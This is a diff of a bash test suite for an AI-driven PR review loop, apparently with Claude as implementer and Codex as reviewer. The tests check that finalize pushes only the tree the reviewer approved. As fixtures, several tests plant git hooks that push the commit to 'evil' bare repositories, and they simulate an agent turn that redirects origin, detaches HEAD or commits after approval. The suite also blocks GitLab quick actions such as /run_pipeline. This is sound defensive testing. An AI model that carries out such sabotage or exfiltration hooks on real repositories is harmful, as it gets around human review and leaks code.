@@ -190,14 +190,37 @@ for a in "$@"; do
         || printf '%s\n' "$STUB_FINALIZE_TITLE" > "$STATE_DIR/local/pr-title.txt"
       [[ "${STUB_FINALIZE_DESC:-}" == "" ]] \
         || printf '%s\n' "$STUB_FINALIZE_DESC" > "$STATE_DIR/local/pr-description.md"
+      # Post-approval mutation attempts: an edit staged into the index, a
+      # commit moving HEAD, or a detached HEAD — finalize must keep every
+      # one of them out of the squash.
+      if [[ "${STUB_FINALIZE_MUTATE:-0}" == "1" ]]; then
+        printf 'mutated after approval\n' >> "$REPO_DIR/f"
+        git -C "$REPO_DIR" add f
+      fi
+      if [[ "${STUB_FINALIZE_COMMIT:-0}" == "1" ]]; then
+        printf 'committed after approval\n' >> "$REPO_DIR/f"
+        git -C "$REPO_DIR" commit -qam 'post-approval commit'
+      fi
+      # Free-form repository sabotage (detaches, branch switches, remote
+      # redirects): evaluated in the checkout, where the real turn runs.
+      if [[ -n "${STUB_FINALIZE_SH:-}" ]]; then
+        ( cd "$REPO_DIR" && eval "$STUB_FINALIZE_SH" )
+      fi
       echo "[CLAUDE_FINALIZE: COMPLETE]"
       exit 0
       ;;
   esac
 done
 # Local review mode: the turn's contract is a written response file, not a
-# comment. STUB_NO_LOCAL_ARTIFACT=1 prints the marker without writing it.
-if [[ "${LOCAL_MODE:-0}" == "1" && "${STUB_NO_LOCAL_ARTIFACT:-0}" != "1" ]]; then
+# comment. STUB_NO_LOCAL_ARTIFACT=1 (both bots) and STUB_NO_CLAUDE_LOCAL_ARTIFACT=1
+# (this bot only) print the marker without writing it.
+# STUB_CLAUDE_COMMIT=1 emulates an implementer round that lands a commit.
+if [[ "${LOCAL_MODE:-0}" == "1" && "${STUB_CLAUDE_COMMIT:-0}" == "1" ]]; then
+  printf 'round %s\n' "$ITER" >> "$REPO_DIR/f"
+  git -C "$REPO_DIR" -c user.name=stub -c user.email=s@s commit -qam "round $ITER"
+fi
+if [[ "${LOCAL_MODE:-0}" == "1" && "${STUB_NO_LOCAL_ARTIFACT:-0}" != "1" \
+      && "${STUB_NO_CLAUDE_LOCAL_ARTIFACT:-0}" != "1" ]]; then
   printf 'stub response\n' > "$STATE_DIR/$(printf 'iter-%02d' "$ITER")/claude-response.md"
 fi
 echo "[CLAUDE_TURN: COMPLETE]"
@@ -222,9 +245,28 @@ printf '{"payload":{"id":"stub-session-uuid","cwd":"%s"}}\n' "$(pwd -P)" \
 if [[ "${LOCAL_MODE:-0}" == "1" && "${STUB_NO_LOCAL_ARTIFACT:-0}" != "1" ]]; then
   printf 'stub review\n' > "$STATE_DIR/$(printf 'iter-%02d' "$ITER")/codex-review.md"
 fi
+# Verdict selection for end-to-end runs: STUB_CODEX_VERDICT fixes it;
+# STUB_CODEX_VERDICT_SEQ names a file whose first line is consumed per
+# invocation (requested changes on round 1, approval on round 2, ...).
+VERDICT="${STUB_CODEX_VERDICT:-APPROVED}"
+if [[ -n "${STUB_CODEX_VERDICT_SEQ:-}" && -s "$STUB_CODEX_VERDICT_SEQ" ]]; then
+  VERDICT=$(head -1 "$STUB_CODEX_VERDICT_SEQ")
+  tail -n +2 "$STUB_CODEX_VERDICT_SEQ" > "$STUB_CODEX_VERDICT_SEQ.tmp" \
+    && mv "$STUB_CODEX_VERDICT_SEQ.tmp" "$STUB_CODEX_VERDICT_SEQ"
+fi
 if [[ "${STUB_CODEX_SILENT:-0}" != "1" ]]; then
-  echo "[CODEX_ISSUES: ${STUB_CODEX_ISSUES:-BLOCKER=0 MAJOR=0 NIT=0}]"
-  echo "[CODEX_VERDICT: ${STUB_CODEX_VERDICT:-APPROVED}]"
+  # A sequenced run derives its counts from the verdict it just consumed;
+  # every other case keeps the fixed default STUB_CODEX_ISSUES overrides.
+  if [[ -n "${STUB_CODEX_VERDICT_SEQ:-}" ]]; then
+    if [[ "$VERDICT" == "APPROVED" ]]; then
+      echo "[CODEX_ISSUES: BLOCKER=0 MAJOR=0 NIT=0]"
+    else
+      echo "[CODEX_ISSUES: BLOCKER=${STUB_CODEX_BLOCKERS:-0} MAJOR=0 NIT=1]"
+    fi
+  else
+    echo "[CODEX_ISSUES: ${STUB_CODEX_ISSUES:-BLOCKER=0 MAJOR=0 NIT=0}]"
+  fi
+  echo "[CODEX_VERDICT: $VERDICT]"
 fi
 exit "${STUB_CODEX_EXIT:-0}"
 EOF
@@ -268,9 +310,16 @@ case "$*" in
     fi
     RAW="[$(IFS=,; echo "${els[*]}")]"
     ;;
+  *"pr view"*)
+    # The live PR text finalize baselines a proposal against; the knobs
+    # emulate a human editing the PR while a proposal is held.
+    printf '{"title":"%s","body":"%s"}\n' \
+      "${STUB_PR_TITLE:-Live title}" "${STUB_PR_BODY:-Live body}"
+    exit 0 ;;
   *"pr edit"*)
     : > "${ARGV_FILE}.ghedit"
     for a in "$@"; do printf '%s\n' "$a" >> "${ARGV_FILE}.ghedit"; done
+    if [[ "${STUB_GH_EDIT_FAIL:-0}" == "1" ]]; then exit 1; fi
     exit 0 ;;
   *) RAW='[]' ;;
 esac
@@ -329,6 +378,8 @@ done
 if [[ "$body" == "@-" || "$body" == "-" ]]; then body="$(cat)"; fi
 [[ -n "${CURL_LOG:-}" ]] && printf '%s %s %s\n' "$method" "$url" "$body" >> "$CURL_LOG"
 [[ -n "${CURL_HDR_LOG:-}" ]] && printf '%s\n' ${hdrs[@]+"${hdrs[@]}"} >> "$CURL_HDR_LOG"
+# Emulate a failing mutation (curl -f style exit) for delivery-retry tests.
+if [[ "$method" == "PUT" && "${STUB_CURL_FAIL_PUT:-0}" == "1" ]]; then exit 22; fi
 case "$method $url" in
   "GET "*"/api/v4/user")
     echo '{"username":"testuser"}'
@@ -376,7 +427,20 @@ PAYLOAD
     ;;
 esac
 EOF
-chmod +x "$STUBS/claude" "$STUBS/codex" "$STUBS/gh" "$STUBS/glab" "$STUBS/curl"
+# mv: the real move, then optionally kill the invoking script once the
+# NAMED state file has been published — crashes finalize exactly between
+# an atomic publish and the cleanup that follows it.
+cat > "$STUBS/mv" <<'EOF'
+#!/usr/bin/env bash
+/bin/mv "$@"
+rc=$?
+if [[ -n "${STUB_KILL_AFTER_MV:-}" && "${*: -1}" == *"/${STUB_KILL_AFTER_MV}" ]]; then
+  kill -9 $PPID
+fi
+exit $rc
+EOF
+
+chmod +x "$STUBS/claude" "$STUBS/codex" "$STUBS/gh" "$STUBS/glab" "$STUBS/curl" "$STUBS/mv"
 
 # --- turn runners --------------------------------------------------------
 
@@ -4363,8 +4427,10 @@ for _f in github gitlab; do
   assert_render_has "$_out" 'Description drift'
 done
 
-# The finalize prompt exists only for local mode.
-for _tags in "local pr github" "local pr gitlab" "local branch"; do
+# The finalize prompt exists only for local mode. squash composes the
+# squashed commit's message; nocommit (nothing landed, PR/MR only) assesses
+# just the title/description.
+for _tags in "local pr github squash" "local pr gitlab squash" "local branch squash"; do
   _out=$(render_forge_blocks "$ROOT/prompts/finalize.md" "$_tags") || _out=''
 
   t "prompts/finalize.md [$_tags]: renders and leaves no block markers"
@@ -4378,7 +4444,7 @@ for _tags in "local pr github" "local pr gitlab" "local branch"; do
   assert_render_has "$_out" '[CLAUDE_FINALIZE: COMPLETE]'
 
   case "$_tags" in
-    *branch)
+    *branch*)
       t "prompts/finalize.md [$_tags]: no title/description step without a PR/MR"
       assert_render_lacks "$_out" 'title and description true'
       ;;
@@ -4387,6 +4453,21 @@ for _tags in "local pr github" "local pr gitlab" "local branch"; do
       assert_render_has "$_out" 'title and description true'
       ;;
   esac
+done
+
+for _tags in "local pr github nocommit" "local pr gitlab nocommit"; do
+  _out=$(render_forge_blocks "$ROOT/prompts/finalize.md" "$_tags") || _out=''
+
+  t "prompts/finalize.md [$_tags]: renders and leaves no block markers"
+  if [[ -n "$_out" ]] && ! grep -qE '\{\{[#/]' <<<"$_out"; then ok
+  else bad "empty render or leftover {{#…}} markers"; fi
+
+  t "prompts/finalize.md [$_tags]: only assesses the title/description"
+  assert_render_has "$_out" 'title and description true'
+  assert_render_lacks "$_out" 'Write the message'
+
+  t "prompts/finalize.md [$_tags]: demands the completion marker"
+  assert_render_has "$_out" '[CLAUDE_FINALIZE: COMPLETE]'
 done
 
 t "prompts: the forked per-forge copies are gone"
@@ -4565,6 +4646,8 @@ local_fixture() {  # -> $LF_REMOTE $LF_CLONE $LF_STATE $LF_BASE, branch feature/
   LF_BASE=$(git -C "$LF_CLONE" rev-parse HEAD)
   LF_STATE="$WORK/$n-state"; mkdir -p "$LF_STATE/local"
   printf '%s\n' "$LF_BASE" > "$LF_STATE/local/base.sha"
+  # What local_setup_repo pins when the review starts.
+  printf '%s\n%s\n' "$LF_REMOTE" "$LF_REMOTE" > "$LF_STATE/local/origin.url"
 }
 local_round() {  # <n> — one implementer round, committed locally
   printf 'round %s\n' "$1" >> "$LF_CLONE/f"
@@ -4615,11 +4698,25 @@ assert_eq "$FIN_RC" 0
 assert_eq "$(git -C "$LF_CLONE" rev-list --count "$LF_BASE..HEAD")" 1
 assert_eq "$(remote_head)" "$LF_BASE"
 
+t "finalize: a held squash records its outcome kind"
+assert_eq "$(awk '{print $1}' "$LF_STATE/local/finalized" 2>/dev/null)" 'squash'
+
 t "finalize: re-running a held squash pushes it without composing again"
 finalize_run STUB_NO_FINALIZE_MSG=1     # a re-compose would leave no message
 assert_eq "$FIN_RC" 0
 assert_eq "$(remote_head)" "$(local_head)"
 assert_eq "$(git -C "$LF_CLONE" log -1 --format=%s)" 'Squashed subject line'
+
+t "finalize: a held outcome whose kind disagrees with the mode is not reused"
+local_fixture; local_round 1
+finalize_run NO_PUSH=1                       # a held SQUASH outcome
+assert_eq "$FIN_RC" 0
+printf 'nocommit %s\n' "$(local_head)" > "$LF_STATE/local/finalized"   # kind says otherwise
+rm -f "$WORK/fin-argv.calls"
+finalize_run STUB_NO_FINALIZE_MSG=1          # a fresh turn writes no message
+assert_eq "$FIN_RC" 1
+if [[ -e "$WORK/fin-argv.calls" ]]; then ok
+else bad "a held outcome was reused despite its kind disagreeing with the mode"; fi
 
 t "finalize: rounds with no net change push nothing"
 local_fixture
@@ -4656,6 +4753,251 @@ finalize_run
 assert_eq "$FIN_RC" 1
 assert_substr "$WORK/fin.log" 'no longer descends from the squash base'
 
+# --- local review mode: only the approved tree is pushed --------------------
+# Nothing the closing turn leaves behind (edits, staged files, commits) and
+# no commit hook may change the tree between Codex's approval and the push.
+
+t "finalize: an edit staged by the closing turn never reaches the squash"
+local_fixture; local_round 1
+_approved=$(git -C "$LF_CLONE" rev-parse 'HEAD^{tree}')
+finalize_run STUB_FINALIZE_MUTATE=1
+assert_eq "$FIN_RC" 0
+assert_eq "$(remote_head)" "$(local_head)"
+assert_eq "$(git -C "$LF_CLONE" rev-parse 'HEAD^{tree}')" "$_approved"
+if git -C "$LF_CLONE" show HEAD:f | grep -q 'mutated after approval'; then
+  bad "a post-approval edit reached the pushed commit"; else ok; fi
+
+t "finalize: a closing turn that commits fails closed, pushing nothing"
+local_fixture; local_round 1
+_tip=$(local_head)
+finalize_run STUB_FINALIZE_COMMIT=1
+assert_eq "$FIN_RC" 1
+assert_eq "$(remote_head)" "$LF_BASE"
+assert_substr "$WORK/fin.log" 'refusing to squash a tree the review never saw'
+assert_eq "$(local_head)" "$_tip"     # rogue commit dropped, rounds restored
+
+t "finalize: a closing turn that detaches HEAD fails closed, pushing nothing"
+local_fixture; local_round 1
+finalize_run STUB_FINALIZE_SH='git checkout -q --detach HEAD'
+assert_eq "$FIN_RC" 1
+assert_eq "$(remote_head)" "$LF_BASE"
+assert_substr "$WORK/fin.log" 'switched or detached'
+
+t "finalize: a turn that redirects origin aborts before any push"
+local_fixture; local_round 1
+_evil="$WORK/evil-a-$RANDOM.git"; git init -q --bare "$_evil"
+finalize_run STUB_FINALIZE_SH="git remote set-url origin $_evil"
+assert_eq "$FIN_RC" 1
+assert_substr "$WORK/fin.log" 'destination of origin changed'
+if git -C "$_evil" show-ref -q 2>/dev/null; then
+  bad "the evil remote received a push"; else ok; fi
+assert_eq "$(remote_head)" "$LF_BASE"
+
+t "finalize: rewrite config cannot redirect the push"
+local_fixture; local_round 1
+_evil="$WORK/evil-b-$RANDOM.git"; git init -q --bare "$_evil"
+finalize_run STUB_FINALIZE_SH="git config url.$_evil.pushInsteadOf $LF_REMOTE"
+assert_eq "$FIN_RC" 1
+if git -C "$_evil" show-ref -q 2>/dev/null; then
+  bad "the evil remote received a push"; else ok; fi
+assert_eq "$(remote_head)" "$LF_BASE"
+
+t "finalize: a turn that removes origin aborts instead of landing locally"
+local_fixture; local_round 1
+finalize_run STUB_FINALIZE_SH='git remote remove origin'
+assert_eq "$FIN_RC" 1
+assert_substr "$WORK/fin.log" 'destination of origin changed'
+if [[ -e "$LF_STATE/local/completed.sha" ]]; then
+  bad "a redirected run was marked completed"; else ok; fi
+
+t "finalize: a redirect planted before finalize dies without spending a turn"
+local_fixture; local_round 1
+_evil="$WORK/evil-c-$RANDOM.git"; git init -q --bare "$_evil"
+git -C "$LF_CLONE" remote set-url origin "$_evil"
+rm -f "$WORK/fin-argv.calls"
+finalize_run
+assert_eq "$FIN_RC" 1
+assert_substr "$WORK/fin.log" 'does not match the one recorded'
+if [[ -e "$WORK/fin-argv.calls" ]]; then
+  bad "an agent turn was spent with a redirected remote"; else ok; fi
+if git -C "$_evil" show-ref -q 2>/dev/null; then
+  bad "the evil remote received a push"; else ok; fi
+
+t "finalize: a missing destination record fails closed"
+local_fixture; local_round 1
+rm -f "$LF_STATE/local/origin.url"    # a turn deleted the pin to force a re-pin
+rm -f "$WORK/fin-argv.calls"
+finalize_run
+assert_eq "$FIN_RC" 1
+assert_substr "$WORK/fin.log" 'no pinned origin destination'
+if [[ -e "$WORK/fin-argv.calls" ]]; then
+  bad "an agent turn was spent with no pinned destination"; else ok; fi
+assert_eq "$(remote_head)" "$LF_BASE"
+
+t "finalize: a held squash is not pushed to a remote redirected in between"
+local_fixture; local_round 1
+finalize_run NO_PUSH=1
+assert_eq "$FIN_RC" 0
+_evil="$WORK/evil-d-$RANDOM.git"; git init -q --bare "$_evil"
+git -C "$LF_CLONE" remote set-url origin "$_evil"
+finalize_run
+assert_eq "$FIN_RC" 1
+assert_substr "$WORK/fin.log" 'does not match the one recorded'
+if git -C "$_evil" show-ref -q 2>/dev/null; then
+  bad "the held squash was pushed to the redirected remote"; else ok; fi
+assert_eq "$(remote_head)" "$LF_BASE"
+
+t "finalize: an appended push URL is caught before the push"
+local_fixture; local_round 1
+_evil="$WORK/evil-e-$RANDOM.git"; git init -q --bare "$_evil"
+finalize_run STUB_FINALIZE_SH="git remote set-url --add --push origin $_evil"
+assert_eq "$FIN_RC" 1
+if git -C "$_evil" show-ref -q 2>/dev/null; then
+  bad "the appended push URL received the commit"; else ok; fi
+assert_eq "$(remote_head)" "$LF_BASE"
+
+t "finalize: repository pre-push hooks never run under the mechanical push"
+local_fixture; local_round 1
+_evil="$WORK/evil-f-$RANDOM.git"; git init -q --bare "$_evil"
+mkdir -p "$LF_CLONE/.git/hooks"
+printf '#!/bin/sh\ngit push -q %s HEAD:refs/heads/stolen\n' "$_evil" \
+  > "$LF_CLONE/.git/hooks/pre-push"
+chmod +x "$LF_CLONE/.git/hooks/pre-push"
+finalize_run
+assert_eq "$FIN_RC" 0
+assert_eq "$(remote_head)" "$(local_head)"
+if git -C "$_evil" show-ref -q 2>/dev/null; then
+  bad "the pre-push hook ran and exfiltrated the commit"; else ok; fi
+
+t "finalize: reference-transaction hooks never run under any ref change"
+local_fixture; local_round 1
+_evil="$WORK/evil-g-$RANDOM.git"; git init -q --bare "$_evil"
+mkdir -p "$LF_CLONE/.git/hooks"
+printf '#!/bin/sh\ngit push -q --no-verify %s HEAD:refs/heads/stolen 2>/dev/null || true\n' "$_evil" \
+  > "$LF_CLONE/.git/hooks/reference-transaction"
+chmod +x "$LF_CLONE/.git/hooks/reference-transaction"
+finalize_run
+assert_eq "$FIN_RC" 0
+assert_eq "$(remote_head)" "$(local_head)"
+if git -C "$_evil" show-ref -q 2>/dev/null; then
+  bad "a reference-transaction hook ran and exfiltrated a commit"; else ok; fi
+
+t "force_clean_to_commit: a post-index-change hook cannot run on the probe"
+local_fixture; local_round 1
+mkdir -p "$LF_CLONE/.git/hooks"
+printf '#!/bin/sh\ntouch generated.txt\n' > "$LF_CLONE/.git/hooks/post-index-change"
+chmod +x "$LF_CLONE/.git/hooks/post-index-change"
+printf 'stray\n' >> "$LF_CLONE/f"          # dirty the index so the probe rewrites it
+env -i PATH="/usr/bin:/bin" HOME="$WORK" \
+  LOCAL_MODE=1 LOCAL_SCOPE=branch REPO_DIR="$LF_CLONE" HEAD_REF=feature/x \
+  MANAGED_CLONE=0 \
+  "$BASH_BIN" -c ". '$ROOT/lib/common.sh'; force_clean_to_commit '$LF_CLONE' '$(local_head)' attach" \
+  >/dev/null 2>&1
+if [[ -e "$LF_CLONE/generated.txt" ]]; then
+  bad "a post-index-change hook ran during the cleanliness probe"; else ok; fi
+
+t "local_setup_repo: a reference-transaction hook cannot run on the pinned base ref"
+local_fixture
+_evil="$WORK/evil-i-$RANDOM.git"; git init -q --bare "$_evil"
+mkdir -p "$LF_CLONE/.git/hooks"
+printf '#!/bin/sh\ngit push -q --no-verify %s HEAD:refs/heads/stolen 2>/dev/null || true\n' "$_evil" \
+  > "$LF_CLONE/.git/hooks/reference-transaction"
+chmod +x "$LF_CLONE/.git/hooks/reference-transaction"
+rm -f "$LF_STATE/local/base.sha"
+env -i PATH="/usr/bin:/bin" HOME="$WORK" \
+  LOCAL_MODE=1 LOCAL_SCOPE=branch MANAGED_CLONE=0 \
+  REPO_DIR="$LF_CLONE" STATE_DIR="$LF_STATE" BASE_REF=main HEAD_REF=feature/x \
+  LOCAL_BASE_SHA="$(git -C "$LF_CLONE" rev-parse "$LF_BASE~1")" \
+  "$BASH_BIN" -c ". '$ROOT/lib/common.sh'; local_setup_repo" >/dev/null 2>&1
+assert_eq "$(git -C "$LF_CLONE" rev-parse refs/ai-pr-loop/base)" \
+          "$(git -C "$LF_CLONE" rev-parse "$LF_BASE~1")"
+if git -C "$_evil" show-ref -q 2>/dev/null; then
+  bad "pinning the base ref ran a reference-transaction hook"; else ok; fi
+
+t "local_record_tip: a reference-transaction hook cannot run on the tip ref"
+local_fixture; local_round 1
+_evil="$WORK/evil-h-$RANDOM.git"; git init -q --bare "$_evil"
+mkdir -p "$LF_CLONE/.git/hooks"
+printf '#!/bin/sh\ngit push -q --no-verify %s HEAD:refs/heads/stolen 2>/dev/null || true\n' "$_evil" \
+  > "$LF_CLONE/.git/hooks/reference-transaction"
+chmod +x "$LF_CLONE/.git/hooks/reference-transaction"
+env -i PATH="/usr/bin:/bin" HOME="$WORK" \
+  LOCAL_MODE=1 LOCAL_SCOPE=pr PR_NUMBER=42 MANAGED_CLONE=0 \
+  REPO_DIR="$LF_CLONE" STATE_DIR="$LF_STATE" HEAD_REF=feature/x \
+  "$BASH_BIN" -c ". '$ROOT/lib/common.sh'; local_record_tip" >/dev/null 2>&1
+assert_eq "$(git -C "$LF_CLONE" rev-parse refs/ai-pr-loop/local/pr-42)" "$(local_head)"
+if git -C "$_evil" show-ref -q 2>/dev/null; then
+  bad "the tip-ref update ran a reference-transaction hook"; else ok; fi
+
+t "finalize: a mutating, rejecting commit hook cannot touch the squash"
+local_fixture; local_round 1
+_approved=$(git -C "$LF_CLONE" rev-parse 'HEAD^{tree}')
+mkdir -p "$LF_CLONE/.git/hooks"
+printf '#!/bin/sh\necho evil > g\ngit add g\nexit 1\n' > "$LF_CLONE/.git/hooks/pre-commit"
+chmod +x "$LF_CLONE/.git/hooks/pre-commit"
+finalize_run
+assert_eq "$FIN_RC" 0
+assert_eq "$(remote_head)" "$(local_head)"
+assert_eq "$(git -C "$LF_CLONE" rev-parse 'HEAD^{tree}')" "$_approved"
+if git -C "$LF_CLONE" show HEAD:g >/dev/null 2>&1; then
+  bad "a hook-injected file is in the pushed commit"; else ok; fi
+
+# --- local review mode: a finished review is terminal -----------------------
+# Once the single commit is in its final resting place — pushed, or the
+# local tip with no origin to push to — nothing may resume the review or
+# rewrite what landed after it.
+
+t "finalize [no origin]: the squashed commit lands and the review completes"
+local_fixture; local_round 1
+git -C "$LF_CLONE" remote remove origin
+printf '(none)\n' > "$LF_STATE/local/origin.url"   # a no-origin review pins "(none)"
+finalize_run
+assert_eq "$FIN_RC" 0
+assert_eq "$(git -C "$LF_CLONE" rev-list --count "$LF_BASE..HEAD")" 1
+assert_eq "$(cat "$LF_STATE/local/completed.sha")" "$(local_head)"
+if [[ -e "$LF_STATE/local/base.sha" || -e "$LF_STATE/local/finalized" ]]; then
+  bad "in-progress markers survived a completed no-origin review"; else ok; fi
+
+t "finalize [no origin]: a rerun after completion squashes nothing again"
+_done=$(local_head)
+finalize_run
+assert_eq "$FIN_RC" 3
+assert_eq "$(local_head)" "$_done"
+
+t "finalize [no origin]: a human commit made after completion is untouched"
+printf 'human follow-up\n' >> "$LF_CLONE/f"
+git -C "$LF_CLONE" commit -qam "human follow-up"
+_human=$(local_head)
+finalize_run
+assert_eq "$FIN_RC" 3
+assert_eq "$(local_head)" "$_human"
+if git -C "$LF_CLONE" merge-base --is-ancestor "$_done" "$_human"; then ok
+else bad "the completed squash is no longer an ancestor of the human commit"; fi
+
+t "finalize: pushback-only agreement (no commits) completes the review"
+local_fixture
+rm -f "$WORK/fin-argv.calls"
+finalize_run
+assert_eq "$FIN_RC" 3
+assert_eq "$(cat "$LF_STATE/local/completed.sha")" "$LF_BASE"
+if [[ -e "$LF_STATE/local/base.sha" ]]; then
+  bad "base.sha survived a completed review"; else ok; fi
+if [[ -e "$WORK/fin-argv.calls" ]]; then
+  bad "a compose turn was spent with nothing to land"; else ok; fi
+
+t "finalize: net-zero rounds complete without spending a compose turn"
+local_fixture
+printf 'x\n' >> "$LF_CLONE/f"; git -C "$LF_CLONE" commit -qam "round 1"
+git -C "$LF_CLONE" revert --no-edit HEAD >/dev/null
+rm -f "$WORK/fin-argv.calls"
+finalize_run
+assert_eq "$FIN_RC" 3
+assert_eq "$(remote_head)" "$LF_BASE"
+assert_eq "$(local_head)" "$LF_BASE"
+assert_eq "$(cat "$LF_STATE/local/completed.sha")" "$LF_BASE"
+if [[ -e "$WORK/fin-argv.calls" ]]; then
+  bad "a compose turn was spent on net-zero rounds"; else ok; fi
+
 # --- local review mode: positioning a PR/MR run ----------------------------
 # The rounds of a PR-scope run sit on a detached HEAD in a checkout shared
 # with other PRs of the repo, so they are kept on a private ref and restored
@@ -4680,8 +5022,50 @@ if env -i PATH="/usr/bin:/bin" HOME="$WORK" \
      "$BASH_BIN" -c ". '$ROOT/lib/common.sh'; local_setup_repo" >/dev/null 2>&1; then
   assert_eq "$(git -C "$LF_CLONE" rev-parse refs/ai-pr-loop/base)" "$_want"
   assert_eq "$(cat "$LF_STATE/local/base.sha")" "$LF_BASE"
+  assert_eq "$(cat "$LF_STATE/local/tip.sha")" "$LF_BASE"
 else
   bad "local_setup_repo failed in branch scope"
+fi
+
+# A branch review's only anchor is the branch itself, so every resume must
+# prove the branch is exactly where the last committed round left it.
+branch_setup() {  # <base-sha> — run local_setup_repo in branch scope
+  setup_run local_setup_repo LOCAL_SCOPE=branch MANAGED_CLONE=0 LOCAL_BASE_SHA="$1"
+}
+
+t "local_setup_repo [branch]: resumes when the branch is on the recorded tip"
+local_round 1
+_tip=$(local_head)
+printf '%s\n' "$_tip" > "$LF_STATE/local/tip.sha"    # what local_record_tip persists
+if branch_setup "$(git -C "$LF_CLONE" rev-parse "$LF_BASE~1")" \
+   && [[ "$(local_head)" == "$_tip" ]]; then ok
+else bad "resume moved the branch ($(tail -1 "$WORK/setup.log"))"; fi
+
+t "local_setup_repo [branch]: a branch reset outside the loop fails closed"
+git -C "$LF_CLONE" reset -q --hard "$LF_BASE"        # round 1 vanishes from the branch
+if branch_setup "$(git -C "$LF_CLONE" rev-parse "$LF_BASE~1")"; then
+  bad "a reset branch was silently resumed at the wrong tip"
+else
+  assert_substr "$WORK/setup.log" 'moved outside the loop'
+fi
+
+t "local_setup_repo [branch]: a branch advanced outside the loop fails closed"
+git -C "$LF_CLONE" reset -q --hard "$_tip"           # back on the recorded tip...
+printf 'foreign\n' >> "$LF_CLONE/f"
+git -C "$LF_CLONE" commit -qam "foreign commit"      # ...plus a commit no turn made
+if branch_setup "$(git -C "$LF_CLONE" rev-parse "$LF_BASE~1")"; then
+  bad "foreign commits would have been squashed as review work"
+else
+  assert_substr "$WORK/setup.log" 'moved outside the loop'
+fi
+
+t "local_setup_repo [branch]: recorded rounds without an expected tip fail closed"
+git -C "$LF_CLONE" reset -q --hard "$_tip"
+rm -f "$LF_STATE/local/tip.sha"
+if branch_setup "$(git -C "$LF_CLONE" rev-parse "$LF_BASE~1")"; then
+  bad "an incomplete state dir was silently trusted"
+else
+  assert_substr "$WORK/setup.log" 'no expected tip'
 fi
 
 t "local_setup_repo [PR/MR]: starts at the PR head and records it as the base"
@@ -4689,6 +5073,7 @@ local_fixture; rm -f "$LF_STATE/local/base.sha"
 git -C "$LF_CLONE" checkout -q main            # a managed clone can be anywhere
 if setup_run local_setup_repo; then
   assert_eq "$(cat "$LF_STATE/local/base.sha")" "$LF_BASE"
+  assert_eq "$(cat "$LF_STATE/local/tip.sha")" "$LF_BASE"
   assert_eq "$(local_head)" "$LF_BASE"
   assert_eq "$(git -C "$LF_CLONE" rev-parse refs/ai-pr-loop/local/pr-42)" "$LF_BASE"
 else
@@ -4699,6 +5084,7 @@ t "local_setup_repo [PR/MR]: a later invocation restores the earlier rounds"
 local_round 1; local_round 2
 _tip=$(local_head)
 git -C "$LF_CLONE" update-ref refs/ai-pr-loop/local/pr-42 "$_tip"
+printf '%s\n' "$_tip" > "$LF_STATE/local/tip.sha"    # what local_record_tip persists
 git -C "$LF_CLONE" checkout -q --detach "$LF_BASE"   # another PR's run moved it
 if setup_run local_setup_repo && [[ "$(local_head)" == "$_tip" ]] \
    && [[ "$(cat "$LF_STATE/local/base.sha")" == "$LF_BASE" ]]; then ok
@@ -4710,6 +5096,24 @@ if setup_run local_setup_repo; then
   bad "a moved PR head was accepted; the squash could never be pushed"
 else
   assert_substr "$WORK/setup.log" 'moved to'
+fi
+
+t "local_setup_repo [PR/MR]: a tip ref moved outside the loop fails closed"
+git -C "$LF_CLONE" push -q origin "$LF_BASE:refs/heads/feature/x" --force  # restore the PR head
+git -C "$LF_CLONE" update-ref refs/ai-pr-loop/local/pr-42 "$LF_BASE"       # ...but the ref moved
+if setup_run local_setup_repo; then
+  bad "a moved tip ref silently dropped the recorded rounds"
+else
+  assert_substr "$WORK/setup.log" 'moved outside the loop'
+fi
+
+t "local_setup_repo [PR/MR]: recorded rounds without an expected tip fail closed"
+git -C "$LF_CLONE" update-ref refs/ai-pr-loop/local/pr-42 "$_tip"
+rm -f "$LF_STATE/local/tip.sha"
+if setup_run local_setup_repo; then
+  bad "an incomplete state dir was silently trusted"
+else
+  assert_substr "$WORK/setup.log" 'no expected tip'
 fi
 
 t "local_setup_repo [PR/MR]: rounds recorded but missing from the checkout fail closed"
@@ -4790,6 +5194,435 @@ assert_eq "$FIN_RC" 0
 assert_eq "$(remote_head)" "$LF_BASE"
 if [[ -e "$WORK/fin-argv.ghedit" ]]; then bad "edited the PR text before the push landed"; else ok; fi
 
+# The one GitLab write must never carry a line GitLab would run as a quick
+# action. The guard is syntactic — any line whose first non-blank character
+# opens a /word — because a denylist of commands falls behind GitLab
+# releases (/run_pipeline, /copy_metadata, ... were not in the original).
+finalize_run_gl() {  # [VAR=VALUE ...] — finalize_run_pr, retargeted at GitLab
+  finalize_run_pr FORGE=gitlab FORGE_HOST=gl.example FORGE_SCHEME=https \
+    PROJECT_ENC=g%2Fp GITLAB_TOKEN=tok CURL_LOG="$WORK/fin-curl.log" \
+    REPO_SLUG=g/p REPO_OWNER=g REPO_NAME=p "$@"
+}
+
+t "finalize [GitLab]: a leading quick action blocks the description update"
+local_pr_fixture
+: > "$WORK/fin-curl.log"
+finalize_run_gl STUB_FINALIZE_DESC=$'New body\n/run_pipeline'
+assert_eq "$FIN_RC" 0
+assert_eq "$(remote_head)" "$(local_head)"
+assert_substr "$WORK/fin.log" 'quick action'
+if grep -q '^PUT .*merge_requests' "$WORK/fin-curl.log"; then
+  bad "the description PUT fired with a quick action in the body"; else ok; fi
+
+t "finalize [GitLab]: leading whitespace does not hide a quick action"
+local_pr_fixture
+: > "$WORK/fin-curl.log"
+finalize_run_gl STUB_FINALIZE_DESC=$'New body\n  /close'
+assert_eq "$FIN_RC" 0
+if grep -q '^PUT .*merge_requests' "$WORK/fin-curl.log"; then
+  bad "an indented quick action reached the MR"; else ok; fi
+
+t "finalize [GitLab]: a clean description is delivered after the push"
+local_pr_fixture
+: > "$WORK/fin-curl.log"
+finalize_run_gl STUB_FINALIZE_DESC='See the notes in /docs/readme.md for details'
+assert_eq "$FIN_RC" 0
+# The logged body is jq-formatted (multi-line), so match its parts apart.
+assert_substr "$WORK/fin-curl.log" 'PUT https://gl.example/api/v4/projects/g%2Fp/merge_requests/42'
+assert_substr "$WORK/fin-curl.log" 'docs/readme.md'
+
+t "finalize [PR/MR]: recovery never moves a branch the turn checked out"
+local_pr_fixture
+git -C "$LF_CLONE" branch victim "$LF_BASE"
+finalize_run_pr STUB_FINALIZE_SH='git checkout -q victim'
+assert_eq "$FIN_RC" 1
+assert_eq "$(git -C "$LF_CLONE" rev-parse refs/heads/victim)" "$LF_BASE"
+assert_eq "$(remote_head)" "$LF_BASE"
+assert_substr "$WORK/fin.log" 'refusing to squash a tree the review never saw'
+
+# --- local review mode: metadata-only finalization (PR/MR, nothing lands) ---
